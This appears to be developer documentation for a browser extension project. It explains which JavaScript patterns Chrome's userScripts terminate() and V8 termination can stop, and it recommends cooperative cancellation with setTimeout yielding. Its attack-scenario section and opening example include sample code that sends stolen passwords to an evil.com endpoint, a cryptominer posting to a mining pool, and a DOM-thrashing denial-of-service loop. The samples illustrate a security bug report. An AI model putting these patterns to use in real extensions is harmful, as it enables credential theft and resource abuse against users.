# Cancellation Limitations - What Can and Cannot Be Stopped

## Quick Answer: Can `fetch().then()` be canceled?

**No, not reliably.** Here's why:

```javascript
// This CANNOT be stopped by terminate():
async function badScript() {
  while (true) {
    await fetch('https://evil.com/track');
    await Promise.resolve();  // Microtask - bypasses V8 termination
  }
}

// This CAN be stopped (with cooperative cancellation):
async function goodScript() {
  while (true) {
    if (window.__scriptCancellations[tempId]) break;
    await fetch('https://api.com/data');
    await new Promise(r => setTimeout(r, 0));  // Macrotask - allows IPC
  }
}
```

## Detailed Limitations

### ❌ CANNOT Cancel (V8 Termination)

#### 1. Active Network Requests
```javascript
// Fetch is already in-flight in network process
const promise = fetch('https://example.com/large-file');
// terminate() called here
await promise;  // Fetch completes anyway, can't be stopped
```
**Why**: Network request runs in separate process, V8 termination only affects JavaScript execution.

#### 2. Async/Await Loops
```javascript
async function loop() {
  for (let i = 0; i < 1000000; i++) {
    await Promise.resolve();  // Microtask queue
    doWork();
  }
}
```
**Why**: Microtasks run without returning to V8 context entry/exit where termination is checked.

#### 3. Promise Chains
```javascript
fetch(url)
  .then(r => r.json())
  .then(data => process(data))
  .then(result => fetch(url2))
  .then(r => r.json())
  // ... 1000 more .then() calls
```
**Why**: Each `.then()` is a microtask, termination check never triggers.

#### 4. Async Generators
```javascript
async function* generate() {
  for (let i = 0; i < 1000000; i++) {
    yield await fetch(`/api/page${i}`);
  }
}

for await (const page of generate()) {
  process(page);
}
```
**Why**: Generator yields create microtasks.

#### 5. SetTimeout Callbacks Already Queued
```javascript
for (let i = 0; i < 1000; i++) {
  setTimeout(() => {
    fetch('/track');  // These callbacks are already queued
  }, i * 1000);
}
// terminate() called immediately
// All 1000 callbacks will still execute over next 1000 seconds
```
**Why**: Timer callbacks are already scheduled in browser, termination doesn't clear them.

#### 6. IndexedDB Operations
```javascript
async function dbLoop() {
  const db = await openDB();
  while (true) {
    await db.get('key');
    await Promise.resolve();
  }
}
```
**Why**: DB operations are async + microtask yielding.

#### 7. Malicious Scripts That Don't Yield
```javascript
while (true) {
  // CPU mining, no yields
  for (let i = 0; i < 1000000; i++) {
    hash = SHA256(hash);
  }
  // No await, no setTimeout - never returns control
}
```
**Why**: Tight synchronous loop blocks everything, even terminate() IPC can't arrive.

### ✅ CAN Cancel (V8 Termination)

#### 1. Pure Synchronous Loops
```javascript
function sync() {
  for (let i = 0; i < 1000000000; i++) {
    // Pure CPU work, no await
  }
}
```
**Why**: V8 checks termination flag periodically during long-running synchronous code.

#### 2. Synchronous DOM Manipulation
```javascript
function domWork() {
  for (let i = 0; i < 10000; i++) {
    document.body.appendChild(document.createElement('div'));
  }
}
```
**Why**: Synchronous, V8 can interrupt.

### ✅ CAN Cancel (Cooperative Cancellation)

#### 1. Scripts That Check Flag
```javascript
async function cooperative() {
  window.__scriptCancellations[tempId] = false;

  while (running) {
    if (window.__scriptCancellations[tempId]) {
      cleanup();
      return { cancelled: true };
    }

    await doWork();
    await new Promise(r => setTimeout(r, 0));  // MUST use setTimeout!
  }
}
```
**Why**: Script voluntarily checks flag and uses macrotask yielding.

#### 2. Scripts Using AbortSignal (chrome.userScripts.execute)
```javascript
// Chrome auto-injects 'signal' variable!
async function withAbortSignal() {
  while (running) {
    // Check signal.aborted (auto-set when terminate() is called)
    if (signal.aborted) {
      cleanup();
      return { cancelled: true };
    }

    await doWork();
    await new Promise(r => setTimeout(r, 0));  // MUST use setTimeout!
  }
}

// Extension calls terminate():
chrome.userScripts.terminate(executionId);
// → Chrome injects: window.__userScriptAborts[executionId].abort()
// → Script detects signal.aborted on next iteration
```
**Why**: Chrome auto-injects AbortController, calls abort() when terminate() is called. Script still must:
- Check `signal.aborted` frequently
- Use `setTimeout()` for macrotask yielding (NOT `Promise.resolve()`)

**IMPORTANT**: AbortSignal does NOT automatically stop your code! It only sets `signal.aborted = true`. Your script must check this flag. The cancellation is purely cooperative.

#### 3. Scripts Using Manual AbortController
```javascript
const controller = new AbortController();

async function withAbort() {
  while (running) {
    if (controller.signal.aborted) {
      return;
    }

    await fetch(url, { signal: controller.signal });
  }
}

// On cancel:
controller.abort();
```
**Why**: Standard cancellation pattern, works if script cooperates.

## The Microtask vs Macrotask Problem

### Why `Promise.resolve()` Blocks Cancellation

```javascript
async function badYielding() {
  for (let i = 0; i < 1000; i++) {
    await Promise.resolve();  // ❌ Microtask
    // Problem: Browser never processes IPC messages
  }
}
```

**Event loop during above code:**
```
Task: Script execution
  → Microtask: Promise.resolve()
  → Microtask: Promise.resolve()
  → Microtask: Promise.resolve()
  → ... (1000 microtasks run without browser processing IPC)
  → Finally: Event Loop
    ← IPC message "set cancellation flag" arrives HERE (too late)
```

### Why `setTimeout(0)` Allows Cancellation

```javascript
async function goodYielding() {
  for (let i = 0; i < 1000; i++) {
    await new Promise(r => setTimeout(r, 0));  // ✅ Macrotask
    // Solution: Browser processes IPC between iterations
  }
}
```

**Event loop during above code:**
```
Task: Script execution (one iteration)
  → Macrotask Queue: setTimeout callback scheduled
  → Event Loop ← IPC messages processed HERE
    ← "Set cancellation flag" arrives within 5-10ms
  → Macrotask: setTimeout callback runs
  → Script checks flag, sees it's cancelled, exits
```

## Real-World Attack Scenarios

### Scenario 1: Data Exfiltration Loop
```javascript
// Malicious extension in content script
async function exfiltrate() {
  while (true) {
    const data = stealPasswords();
    await fetch('https://evil.com/collect', {
      method: 'POST',
      body: JSON.stringify(data)
    });
    await Promise.resolve();  // ❌ Can't be stopped
  }
}
```

**Impact**:
- User clicks "Remove Extension"
- Extension continues running until page reload/close
- Data continues being exfiltrated
- `terminate()` doesn't work

### Scenario 2: Cryptocurrency Mining
```javascript
async function mine() {
  while (true) {
    const nonce = Math.random();
    const hash = await crypto.subtle.digest('SHA-256', nonce);
    if (isValidHash(hash)) {
      await fetch('https://mining-pool.com/submit', {
        method: 'POST',
        body: hash
      });
    }
    await Promise.resolve();  // ❌ Can't be stopped
  }
}
```

**Impact**:
- Drains CPU indefinitely
- User's computer becomes unresponsive
- `terminate()` doesn't work
- Must force-quit browser

### Scenario 3: DOM Thrashing DoS
```javascript
async function thrash() {
  while (true) {
    for (let i = 0; i < 1000; i++) {
      document.body.appendChild(createHeavyElement());
    }
    await Promise.resolve();  // ❌ Can't be stopped
  }
}
```

**Impact**:
- Page becomes unusable
- Browser memory exhaustion
- `terminate()` doesn't work

## Recommendations for Extension Developers

### ✅ DO: Design Scripts for Cancellation

```javascript
// 1. Generate unique ID
const tempId = 'exec_' + Date.now() + '_' + Math.random();

// 2. Initialize cancellation flag
window.__scriptCancellations = window.__scriptCancellations || {};
window.__scriptCancellations[tempId] = false;

// 3. Check flag frequently
async function cancellableWork() {
  while (running) {
    // Check FIRST before doing work
    if (window.__scriptCancellations[tempId]) {
      cleanup();
      return { cancelled: true };
    }

    // Do work
    await doSomeWork();

    // CRITICAL: Use setTimeout not Promise.resolve
    await new Promise(resolve => setTimeout(resolve, 0));
  }
}

// 4. On cancel, inject flag setter
chrome.scripting.executeScript({
  target: { tabId },
  func: (id) => {
    window.__scriptCancellations = window.__scriptCancellations || {};
    window.__scriptCancellations[id] = true;
  },
  args: [tempId],
  world: 'MAIN'
});
```

### ❌ DON'T: Rely on V8 Termination for Async Code

```javascript
// This WON'T be cancelled:
async function uncancellable() {
  while (true) {
    await fetch('/api/data');
    await processData();
    await Promise.resolve();  // Microtask - ignores termination
  }
}

// Even though you call:
chrome.userScripts.terminate(executionId);  // Does nothing for async
```

### ✅ DO: Yield Control Properly

```javascript
// WRONG: Microtask (blocks IPC)
await Promise.resolve();

// WRONG: No yield (blocks everything)
// (just continuing synchronously)

// RIGHT: Macrotask (allows IPC)
await new Promise(resolve => setTimeout(resolve, 0));

// ALSO RIGHT: Longer delays if appropriate
await new Promise(resolve => setTimeout(resolve, 100));
```

### ✅ DO: Clean Up Resources on Cancellation

```javascript
async function properCleanup() {
  const resources = [];

  try {
    while (running) {
      if (window.__scriptCancellations[tempId]) {
        throw new Error('Cancelled');
      }

      const resource = await allocateResource();
      resources.push(resource);

      await doWork(resource);
      await new Promise(r => setTimeout(r, 0));
    }
  } finally {
    // Always clean up, even if cancelled
    resources.forEach(r => r.release());
  }
}
```

## Summary Table

| Code Pattern | V8 Terminate | Cooperative (AbortSignal) | Notes |
|-------------|--------------|--------------------------|-------|
| `while(true) {}` sync | ✅ Works | N/A | Blocks IPC too |
| `while(true) { await Promise.resolve() }` | ❌ Fails | ❌ Fails | Microtasks block IPC |
| `while(true) { if (signal.aborted) break; await setTimeout() }` | ❌ Fails | ✅ Works | **Recommended pattern** |
| `fetch().then().then()` | ❌ Fails | ❌ Fails | Promise chain is microtasks |
| `fetch(url, { signal })` | ❌ Fails | ✅ Works | Fetch honors signal |
| Script checks flag + setTimeout | ❌ Fails | ✅ Works | Both patterns work |
| Active network request (no signal) | ❌ Fails | ❌ Fails | Network process independent |
| Queued setTimeout callbacks | ❌ Fails | ❌ Fails | Already scheduled |

## Bottom Line

**The `terminate()` API is fundamentally broken for modern JavaScript.**

Extensions MUST implement cooperative cancellation with proper macrotask yielding to have any hope of stopping long-running scripts. The V8 termination mechanism only works for synchronous code, which is rare in 2025.

This is a **security issue** because malicious extensions can run indefinitely without any programmatic way to stop them.

---

See `IDS_BUG.md` for the full bug report and proposed solutions.
